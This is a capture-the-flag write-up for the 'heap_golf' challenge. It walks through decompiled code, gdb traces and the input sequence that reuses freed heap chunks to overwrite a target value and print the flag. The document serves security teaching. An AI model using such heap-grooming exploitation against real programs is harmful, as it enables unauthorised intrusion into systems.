# 	heap_golf

The goal of this challenge is to print the contents of `flag.txt`, not pop a shell.

Let's take a look at the binary:
```
$	file heap_golf1 
heap_golf1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=ea4a50178915e1adee07a464e42cec0d6f9a9f62, not stripped
$ pwn checksec heap_golf1 
[*] '/Hackery/pod/modules/heap_grooming/swamp19_heapgolf/heap_golf1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./heap_golf1 
target green provisioned.
enter -1 to exit simulation, -2 to free course.
Size of green to provision: 32
Size of green to provision: -2
target green provisioned.
Size of green to provision: -1
```

So we are dealing with a 64 bit binary that provides us with three different inputs. 

## Reversing

```

undefined8 main(void)

{
  long lVar1;
  int input;
  int *target;
  int *newPtr;
  long in_FS_OFFSET;
  int x;
  int i;
  int *ptr [50];
  char buf [8];
  long canary;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  target = (int *)malloc(0x20);
  write(0,"target green provisioned.\n",0x1a);
  x = 1;
  write(0,"enter -1 to exit simulation, -2 to free course.\n",0x30);
  do {
    write(0,"Size of green to provision: ",0x1c);
    read(1,buf,4);
    input = atoi(buf);
    if (input == -1) {
LAB_004008c3:
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    if (input == -2) {
      i = 0;
      while (i < x) {
        free(ptr[(long)i]);
        i = i + 1;
      }
      ptr[0] = (int *)malloc(0x20);
      write(0,"target green provisioned.\n",0x1a);
      x = 1;
    }
    else {
      newPtr = (int *)malloc((long)input);
      *newPtr = x;
      ptr[(long)x] = newPtr;
      x = x + 1;
      if (x == 0x30) {
        write(0,"You\'re too far under par.",0x19);
        goto LAB_004008c3;
      }
    }
    if (*target == 4) {
      win_func();
    }
  } while( true );
}
```

So we can see what's going on. This is a heap grooming challenge. It stores and array of heap pointers in `ptr`. The first entry in the heap pointers array is `target`, which we have to set equal to `0x4` without any direct way of doing so. If we input anything other than a `-1` or `-2`, then it takes the integer value we passed it and mallocs it. It will then dereference it and set it equal to the heap pointer counter `x`. After that it will append it to the end of the heap pointers. If we input a `-1` the binary ends. If we input a `-2` it will go through and free all of the pointers, and malloc a new first pointer and reset the pointer counter `x` to 1.

Malloc will reuse previously freed chunks if they are the right size for performance reasons. What we can do is allocate `4` `0x20` block chunks (not including the one initially allocated), and then free them. Then when we allocate `0x20` byte chunks, we will get those same chunks back in the inverse order they were freed (so the last chunk we made will be the first allocated). Then the fourth chunk we allocate will be the first chunk allocated and have the same address as `target`, and also have the pointer counter `x` written to it:

Pointers being freed in gdb (in this case it's `0x602260`):
```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
     0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
     0x4007f0 <main+233>       mov    rdi, rax
 →   0x4007f3 <main+236>       call   0x400570 <free@plt>
   ↳    0x400570 <free@plt+0>     jmp    QWORD PTR [rip+0x200aa2]        # 0x601018
        0x400576 <free@plt+6>     push   0x0
        0x40057b <free@plt+11>    jmp    0x400560
        0x400580 <write@plt+0>    jmp    QWORD PTR [rip+0x200a9a]        # 0x601020
        0x400586 <write@plt+6>    push   0x1
        0x40058b <write@plt+11>   jmp    0x400560
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x0000000000602260 → 0x0000000000000000,
   $rsi = 0x00000000ffffffda,
   $rdx = 0x8000000000000000
)
```

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
     0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
     0x4007f0 <main+233>       mov    rdi, rax
 →   0x4007f3 <main+236>       call   0x400570 <free@plt>
   ↳    0x400570 <free@plt+0>     jmp    QWORD PTR [rip+0x200aa2]        # 0x601018
        0x400576 <free@plt+6>     push   0x0
        0x40057b <free@plt+11>    jmp    0x400560
        0x400580 <write@plt+0>    jmp    QWORD PTR [rip+0x200a9a]        # 0x601020
        0x400586 <write@plt+6>    push   0x1
        0x40058b <write@plt+11>   jmp    0x400560
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x0000000000602290 → 0x0000000000000001,
   $rsi = 0x0000000000602018 → 0x0000000000000000,
   $rdx = 0x0000000000602010 → 0x0000000000000100
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
```

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
     0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
     0x4007f0 <main+233>       mov    rdi, rax
 →   0x4007f3 <main+236>       call   0x400570 <free@plt>
   ↳    0x400570 <free@plt+0>     jmp    QWORD PTR [rip+0x200aa2]        # 0x601018
        0x400576 <free@plt+6>     push   0x0
        0x40057b <free@plt+11>    jmp    0x400560
        0x400580 <write@plt+0>    jmp    QWORD PTR [rip+0x200a9a]        # 0x601020
        0x400586 <write@plt+6>    push   0x1
        0x40058b <write@plt+11>   jmp    0x400560
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x00000000006022c0 → 0x0000000000000002,
   $rsi = 0x0000000000602018 → 0x0000000000000000,
   $rdx = 0x0000000000602010 → 0x0000000000000200
)
```

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
     0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
     0x4007f0 <main+233>       mov    rdi, rax
 →   0x4007f3 <main+236>       call   0x400570 <free@plt>
   ↳    0x400570 <free@plt+0>     jmp    QWORD PTR [rip+0x200aa2]        # 0x601018
        0x400576 <free@plt+6>     push   0x0
        0x40057b <free@plt+11>    jmp    0x400560
        0x400580 <write@plt+0>    jmp    QWORD PTR [rip+0x200a9a]        # 0x601020
        0x400586 <write@plt+6>    push   0x1
        0x40058b <write@plt+11>   jmp    0x400560
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x00000000006022f0 → 0x0000000000000003,
   $rsi = 0x0000000000602018 → 0x0000000000000000,
   $rdx = 0x0000000000602010 → 0x0000000000000300
)
``` 

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e5 <main+222>       dec    DWORD PTR [rax-0x68]
     0x4007e8 <main+225>       mov    rax, QWORD PTR [rbp+rax*8-0x1a0]
     0x4007f0 <main+233>       mov    rdi, rax
 →   0x4007f3 <main+236>       call   0x400570 <free@plt>
   ↳    0x400570 <free@plt+0>     jmp    QWORD PTR [rip+0x200aa2]        # 0x601018
        0x400576 <free@plt+6>     push   0x0
        0x40057b <free@plt+11>    jmp    0x400560
        0x400580 <write@plt+0>    jmp    QWORD PTR [rip+0x200a9a]        # 0x601020
        0x400586 <write@plt+6>    push   0x1
        0x40058b <write@plt+11>   jmp    0x400560
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x0000000000602320 → 0x0000000000000004,
   $rsi = 0x0000000000602018 → 0x0000000000000000,
   $rdx = 0x0000000000602010 → 0x0000000000000400
)
```

When they are reallocated:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40084e <main+327>       mov    QWORD PTR [rbp-0x1a8], rax
     0x400855 <main+334>       mov    rax, QWORD PTR [rbp-0x1a8]
     0x40085c <main+341>       mov    edx, DWORD PTR [rbp-0x1bc]
 →   0x400862 <main+347>       mov    DWORD PTR [rax], edx
     0x400864 <main+349>       mov    eax, DWORD PTR [rbp-0x1bc]
     0x40086a <main+355>       cdqe   
     0x40086c <main+357>       mov    rdx, QWORD PTR [rbp-0x1a8]
     0x400873 <main+364>       mov    QWORD PTR [rbp+rax*8-0x1a0], rdx
     0x40087b <main+372>       add    DWORD PTR [rbp-0x1bc], 0x1
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heap_golf1", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400862 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 2, 0x0000000000400862 in main ()
gef➤  p $edx
$1 = 0x1
gef➤  p $rax
```

```
Breakpoint 2, 0x0000000000400862 in main ()
gef➤  p $edx
$3 = 0x2
gef➤  p $rax
$4 = 0x6022c0
```

```
Breakpoint 2, 0x0000000000400862 in main ()
gef➤  p $edx
$5 = 0x3
gef➤  p $rax
$6 = 0x602290
```

```
Breakpoint 2, 0x0000000000400862 in main ()
gef➤  p $edx
$7 = 0x4
gef➤  p $rax
$8 = 0x602260
```

With that last iteration, we finally write the value `0x4` to the address of target `0x602260`. With that we can capture the flag.

```
$ /heap_golf1 
target green provisioned.
enter -1 to exit simulation, -2 to free course.
Size of green to provision: 32
Size of green to provision: 32
Size of green to provision: 32
Size of green to provision: 32
Size of green to provision: -2
target green provisioned.
Size of green to provision: 32
Size of green to provision: 32
Size of green to provision: 32
Size of green to provision: 32
flag{g0ttem_b0is}
```